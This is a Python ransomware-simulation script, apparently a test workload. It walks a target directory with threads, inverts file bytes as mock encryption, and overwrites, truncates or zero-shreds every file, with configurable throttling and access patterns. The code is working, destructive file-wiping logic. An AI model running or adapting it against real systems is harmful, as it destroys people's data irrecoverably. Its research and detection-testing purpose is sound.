import os
import shutil
import sys

import threading
from queue import Queue, PriorityQueue

config_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

sys.path.append(config_dir)

from config import PATHS, LOG_NAME, MAGIC_NUM
from config import print_red

mode = 'O'
timeout = 0
blknum = 25000
threads = 1
access = 'R'
Nrthreads = 1
Nwthreads = 1
Yfsync = 'N'
rwsplit = 'N'

class NoneWrapper:
    """
    workaround for priority queue not supporting None
    """
    def __lt__(self, other):
        return False


class Chunk:
    def __init__(self, fpath, loff, length, data=None):
        self.fpath = fpath
        self.loff = loff
        self.length = length
        self.data = data

    def __lt__(self, other):
        if not isinstance(other, Chunk):
            return NotImplemented
        return (self.fpath, self.loff) < (other.fpath, other.loff)

def encrypt(data):
    """
    Encrypt the data by reverting each byte.
    """
    return bytes(~x & 0xff for x in data)

import time
class Stopper:
    """
    This class is used to stop the ransomware after numblk blocks are operated.
    This class should compatibly work with multi-threaded and R W concurrent situation.
    Each stop should last for timeout seconds.
    """
    def __init__(self, numblk, timeout):
        self.numblk_std = numblk
        self.numblk = numblk
        self.timeout = timeout
        self.lock = threading.Lock()
        self.stop = False
        self.stop_time = 0

    def _check_stop(self):
        """
        Check if the ransomware should stop.
        @note : Caller should hold a lock.
        """
        if self.stop:
            if time.time() - self.stop_time > self.timeout:
                self.stop = False
                self.numblk = self.numblk_std
                return False
            else:
                return True
        else:
            return False

    def _stop_now(self):
        """
        Force the ransomware (all operations) to stop until a timeout is reached.
        @note caller should hold a lock.
        """
        if not self.stop:
            # print_red("stopped")
            self.stop = True
            self.stop_time = time.time()
        else:
            print_red("ERR : Stop already set")

    def try_stop(self, _numblk):
        """
        Try to stop the ransomware if the accumulated number of blocks reaches a certain amount.
        If a stop is reached, stop now, and clear the numblk counter.
        """
        with self.lock:
            if not self._check_stop() and _numblk <= self.numblk:
                self.numblk -= _numblk
            elif not self._check_stop() and _numblk > self.numblk:
                self.numblk = 0
                self._stop_now()
                while self._check_stop():
                    time.sleep(1)



def read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, stopper,
                      chunk_size = 4096, num_threads = 1, rm = False, shred = False):
    """
    Read files from tar_sys_path and insert them into a queue.
    The access pattern is sequential.
    @rm determines whether we need to remove the file and 
    create an empty one after reading it.
    """
    MAGIC_3 = MAGIC_NUM['MAGIC_NUM3']

    # Add all the filenames to the queue
    for root, dirs, files in os.walk(tar_sys_path):
        for filename in files:
            filepath = os.path.join(root, filename)
            fname_queue.put(filepath)

    # Create a worker function to read files and insert chunks into the ChunkSet
    def worker(queue):
        while True:
            # Get the next filename from the queue
            filepath = fname_queue.get()
            if filepath is None:
                break

            # Read the file contents into memory
            with flocks[filepath]:
                with open(filepath, "rb") as f:
                    file_contents = f.read()
                    stopper.try_stop(len(file_contents))

                flen = os.path.getsize(filepath)
                if shred:
                    with open(filepath, "r+b") as f:
                        f.write(bytes([0] * flen))
                        f.flush()
                        os.fsync(f.fileno())
                if rm:
                    with open(filepath, "wb") as f:
                        pass
                if (not shred and rm) and Yfsync == 'Y':
                    with open(filepath, "r+b") as f:
                        f.flush()
                        os.fsync(f.fileno())
            if file_contents:
                MAGIC_3 = file_contents[0]
            # Split the file contents into chunks and insert them into the ChunkSet
            loff = 0
            while loff < len(file_contents):
                chunk = encrypt(file_contents[loff:loff+chunk_size])
                queue.put(Chunk(filepath, loff, len(chunk), chunk))
                loff += len(chunk)
            # Mark the filename as done
            fname_queue.task_done()

    # Create a pool of worker threads
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(queue,))
        t.start()
        threads.append(t)

    return threads


def read_rand_threaded(tar_sys_path, queue, fname_queue, flocks, stopper,
                       chunk_size = 4096, num_threads = 1, rm = False, shred = False):
    """
    Read files from tar_sys_path and insert them into a queue.
    The access pattern is random. To achieve this, we use 1 shuffle to randomize the loff_set.
    @rm determines whether we need to remove the file and 
    create an empty one after reading it.
    """

    # Add all the filenames to the queue
    for root, dirs, files in os.walk(tar_sys_path):
        for filename in files:
            filepath = os.path.join(root, filename)
            fname_queue.put(filepath)

    # Create a worker function to read files and insert chunks into the ChunkSet
    def worker(queue):
        while True:
            # Get the next filename from the queue
            filepath = fname_queue.get()
            if filepath is None:
                break
            # Get the file length first
            flen = os.path.getsize(os.path.join(root, filepath))
            loff_set = [i for i in range(0, flen, chunk_size)]
            import random
            random.shuffle(loff_set)
            # Read the file contents into memory
            with flocks[filepath]:
                with open(filepath, "rb") as f:
                    # randomize the loff_set
                    if filepath.count(os.sep) == 6:
                        print(filepath, loff_set)
                    for loff in loff_set:
                        f.seek(loff)
                        chunk = f.read(chunk_size)
                        stopper.try_stop(len(chunk))
                        chunk = encrypt(chunk)
                        queue.put(Chunk(filepath, loff, len(chunk), chunk))
                flen = os.path.getsize(filepath)
                if shred:
                    with open(filepath, "r+b") as f:
                        f.write(bytes([0] * flen))
                        f.flush()
                        os.fsync(f.fileno())
                if rm:
                    with open(filepath, "wb") as f:
                        pass
                if (not shred and rm) and Yfsync == 'Y':
                    with open(filepath, "r+b") as f:
                        f.flush()
                        os.fsync(f.fileno())

            # Mark the filename as done
            fname_queue.task_done()

    # Create a pool of worker threads
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(queue,))
        t.start()
        threads.append(t)

    return threads

def flush_sync_files(tar_sys_path):
    """ 
    Flush the files in tar_sys_path to disk by calling f.flush then os.sync.
    """
    import time
    flush_start = time.time()
    for root, dirs, files in os.walk(tar_sys_path):
        for filename in files:
            filepath = os.path.join(root, filename)
            with open(filepath, "r+b") as f:
                f.flush()
                os.fsync(f.fileno())
    print(f"Flush time: {time.time() - flush_start} seconds")


def flush_chunk_buf(chunks, flocks = None):
    """
    This flush is needed for creating a random access write workload.
    When writing, we first cache some blocks in memory, then we shuffle the blocks.
    Then we write the blocks back to disk in a random order.
    Note :
        This function has nonthing to do with consistency (flush & sync)
    """
    if flocks is None:
        for chunk in chunks:
            with open(chunk.fpath, "r+b") as f:
                f.seek(chunk.loff)
                f.write(chunk.data)
    else:
        for chunk in chunks:
            with flocks[chunk.fpath]:
                with open(chunk.fpath, "r+b") as f:
                    f.seek(chunk.loff)
                    f.write(chunk.data)

    chunks.clear()

# write has side-effect of flushing & syncing if enabled


def write_seq_threaded(queue, tar_sys_path, flocks, stopper,
                       num_threads = 1):
    """
    Write the encrypted chunks in chunk_set back to tar_sys_path in parallel.
    """

    # Create a worker function to write files
    def worker(queue):
        while True:
            # Get the next filename from the queue
            chunk = queue.get()
            if isinstance(chunk, NoneWrapper):
                # print_red("!")
                break
            # Write the file contents to disk
            with flocks[chunk.fpath]:
                with open(chunk.fpath, "r+b") as f:
                    f.seek(chunk.loff)
                    # f.write(chunk.data)
                    f.write(bytes([ord('C')]*len(chunk.data)))
                    stopper.try_stop(len(chunk.data))

            # Mark the filename as done
            queue.task_done()
            

    # Create a pool of worker threads
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(queue,))
        t.start()
        threads.append(t)

    return threads

def write_rand_threaded(queue, tar_sys_path, flocks, stopper, 
                        num_threads = 1):
    """
    Write the encrypted chunks in chunk_set back to tar_sys_path in parallel.
    """
    # Create a worker function to write files
    def worker(queue):
        import random
        CHUNK_CACHE_SIZE = 10
        chunks = []
        while True:
            # Get the next filename from the queue
            chunk = queue.get()
            if isinstance(chunk, NoneWrapper):
                break
            chunks.append(chunk)
            if len(chunks) == CHUNK_CACHE_SIZE:
                random.shuffle(chunks)
                flush_chunk_buf(chunks, flocks)
                stopper.try_stop(sum([len(chunk.data) for chunk in chunks]))

            # Mark the filename as done
            queue.task_done()

        if chunks:
            random.shuffle(chunks)
            flush_chunk_buf(chunks, flocks)
            stopper.try_stop(sum([len(chunk.data) for chunk in chunks]))
            

    # Create a pool of worker threads
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(queue,))
        t.start()
        threads.append(t)

    return threads

  


# below are a list of operation sequences

def main_overwrite():
    tar_sys_path = PATHS['injected_path']
    rstopper = Stopper(int(blknum.split('/')[0]) * 512, int(timeout.split('/')[0]))
    wstopper = Stopper(int(blknum.split('/')[1]) * 512, int(timeout.split('/')[1]))
    # file locks(flocks) are to protect against seek race conditions
    # Notice in python open will also move the file pointer, so 
    # seek, open should be protected by the same lock.
    # Each file 
    flocks = {os.path.join(root, filename) : threading.Lock() 
             for root, dirs, files in os.walk(tar_sys_path) 
                for filename in files} 
    queue = PriorityQueue()
    fname_queue = Queue()
    if access.split('/')[0].rstrip('\n') == 'R':
        rthreads = read_rand_threaded(tar_sys_path, queue, fname_queue, flocks, rstopper, 
                                        chunk_size = 4096, num_threads = Nrthreads)
    elif access.split('/')[0].rstrip('\n') == 'S':
        rthreads = read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, rstopper,
                                    chunk_size = 4096, num_threads = Nrthreads)
    else:
        print("------ ERR -------")
        print("Invalid access pattern")
        print("------------------")
        exit(1)

    if rwsplit == 'Y':
        # wait for all the read threads to finish
        fname_queue.join()
        for i in range(len(rthreads)):
            fname_queue.put(None)
        for t in rthreads:
            t.join()

    if access.split('/')[1].rstrip('\n') == 'R':
        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, wstopper,
                                       num_threads = Nwthreads)
    elif access.split('/')[1].rstrip('\n') == 'S':
        wthreads = write_seq_threaded(queue, tar_sys_path, flocks, wstopper,
                                       num_threads = Nwthreads)
    else:
        print("------ ERR -------")
        print("Invalid access pattern")
        print("------------------")
        exit(1)
    
    if rwsplit == 'N':
        # wait for all the read threads to finish
        fname_queue.join()
        for i in range(len(rthreads)):
            fname_queue.put(None)
        for t in rthreads:
            t.join()

    # wait for all the write threads to finish
    queue.join()
    for i in range(len(wthreads)):
        queue.put(NoneWrapper()) 
    for t in wthreads:
        t.join()

    flush_sync_files(tar_sys_path)

    


    
def main_deletecreate():
    tar_sys_path = PATHS["injected_path"]
    rstopper = Stopper(int(blknum.split('/')[0]) * 512, int(timeout.split('/')[0]))
    wstopper = Stopper(int(blknum.split('/')[1]) * 512, int(timeout.split('/')[1]))
    queue = PriorityQueue()

    flocks = {os.path.join(root, filename) : threading.Lock() 
             for root, dirs, files in os.walk(tar_sys_path) 
                for filename in files} 
    queue = PriorityQueue()
    fname_queue = Queue()

    if access.split('/')[0].rstrip('\n') == 'R':
        rthreads = read_rand_threaded(tar_sys_path, queue, fname_queue, flocks, rstopper, 
                                        chunk_size = 4096, num_threads = Nrthreads, rm = True)
    elif access.split('/')[0].rstrip('\n') == 'S':
        rthreads = read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, rstopper,
                                    chunk_size = 4096, num_threads = Nrthreads, rm = True)
    else:
        print("------ ERR -------")
        print("Invalid access pattern")
        print("------------------")
        exit(1)
    if rwsplit == 'Y':
        # wait for all the read threads to finish
        fname_queue.join()
        for i in range(len(rthreads)):
            fname_queue.put(None)
        for t in rthreads:
            t.join()
    if access.split('/')[1].rstrip('\n') == 'R':
        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, wstopper,
                                       num_threads = Nwthreads)
    elif access.split('/')[1].rstrip('\n') == 'S':
        wthreads = write_seq_threaded(queue, tar_sys_path, flocks, wstopper,
                                       num_threads = Nwthreads)
    else:
        print("------ ERR -------")
        print("Invalid access pattern")
        print("------------------")
        exit(1)
    if rwsplit == 'N':
        # wait for all the read threads to finish
        fname_queue.join()
        for i in range(len(rthreads)):
            fname_queue.put(None)
        for t in rthreads:
            t.join()

    # wait for all the write threads to finish
    queue.join()
    for i in range(len(wthreads)):
        queue.put(NoneWrapper()) 
    for t in wthreads:
        t.join()

    flush_sync_files(tar_sys_path)

def main_shredcreate():
    tar_sys_path = PATHS["injected_path"]
    rstopper = Stopper(int(blknum.split('/')[0]) * 512, int(timeout.split('/')[0]))
    wstopper = Stopper(int(blknum.split('/')[1]) * 512, int(timeout.split('/')[1]))
    queue = PriorityQueue()

    flocks = {os.path.join(root, filename) : threading.Lock() 
             for root, dirs, files in os.walk(tar_sys_path) 
                for filename in files} 
    queue = PriorityQueue()
    fname_queue = Queue()

    if access.split('/')[0].rstrip('\n') == 'R':
        rthreads = read_rand_threaded(tar_sys_path, queue, fname_queue, flocks, rstopper,
                                        chunk_size = 4096, num_threads = Nrthreads, 
                                        rm = True, shred = True)
    elif access.split('/')[0].rstrip('\n') == 'S':
        rthreads = read_seq_threaded(tar_sys_path, queue, fname_queue, flocks,  rstopper,
                                    chunk_size = 4096, num_threads = Nrthreads,
                                    rm = True, shred = True)
    else:
        print("------ ERR -------")
        print("Invalid access pattern")
        print("------------------")
        exit(1)

    if rwsplit == 'Y':
        # wait for all the read threads to finish
        fname_queue.join()
        for i in range(len(rthreads)):
            fname_queue.put(None)
        for t in rthreads:
            t.join()

    if access.split('/')[1].rstrip('\n') == 'R':
        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, wstopper,
                                       num_threads = Nwthreads)
    elif access.split('/')[1].rstrip('\n') == 'S':
        wthreads = write_seq_threaded(queue, tar_sys_path, flocks, wstopper,
                                       num_threads = Nwthreads)
    else:
        print("------ ERR -------")
        print("Invalid access pattern")
        print("------------------")
        exit(1)
    if rwsplit == 'N':
        # wait for all the read threads to finish
        fname_queue.join()
        for i in range(len(rthreads)):
            fname_queue.put(None)
        for t in rthreads:
            t.join()

    # wait for all the write threads to finish
    queue.join()
    for i in range(len(wthreads)):
        queue.put(NoneWrapper()) 
    for t in wthreads:
        t.join()

    flush_sync_files(tar_sys_path)

# below are a list of helper functions

def read_attr():
    global mode, timeout, blknum, threads, access, Yfsync, rwsplit
    global Nrthreads, Nwthreads
    test_dir_path_file = PATHS['test_dir_path_file']
    with open(test_dir_path_file, 'r') as f:
        test_dir = f.read()
    attr_file = os.path.join(test_dir, LOG_NAME['test_info'])
    with open(attr_file, 'r') as f:
        lines = f.readlines()
        for line in lines:
            if line.startswith('mode='):
                mode = line.split('=')[1].rstrip('\n')
            elif line.startswith('timeout='):
                timeout = line.split('=')[1].rstrip('\n')
            elif line.startswith('blknum='):
                blknum = line.split('=')[1].rstrip('\n')
            elif line.startswith('threads='):
                threads = line.split('=')[1].rstrip('\n')
                Nrthreads = int(threads.split('/')[0])
                Nwthreads = int(threads.split('/')[1].rstrip('\n'))
            elif line.startswith('access='):
                access = line.split('=')[1].rstrip('\n')
            elif line.startswith('fsync='):
                Yfsync = line.split('=')[1].rstrip('\n')
            elif line.startswith('rwsplit='):
                rwsplit = line.split('=')[1].rstrip('\n')
    print(f"mode={mode} timeout={timeout} blknum={blknum}")
    print(f"threads={threads} access={access} rwsplit={rwsplit} fsync={Yfsync}")
    # sanity check
    if mode != 'O' and mode != 'D' and mode[0] != 'S':
        print_red(f"Invalid mode {mode}")
        exit(1)
    if rwsplit != 'Y' and rwsplit != 'N':
        print_red(f"Invalid rwsplit {rwsplit}")
        exit(1)
    if Yfsync != 'Y' and Yfsync != 'N':
        print_red(f"Invalid fsync {Yfsync}")
        exit(1)
    if access != 'R/R' and access != 'R/S' and access != 'S/R' and access != 'S/S':
        print_red(f"Invalid access {access}")
        exit(1)
    if Nrthreads < 1 or Nwthreads < 1:
        print_red(f"Invalid threads {threads}")
        exit(1)
    return

if __name__ == '__main__':
    read_attr()
    if mode == 'O':
        main_overwrite()
    elif mode == 'D':
        main_deletecreate()
    elif mode[0] == 'S':
        for i in range(0,int(mode[1:])): # shred # times
            main_shredcreate()
    else:
        print('Invalid mode number')
        exit(1)
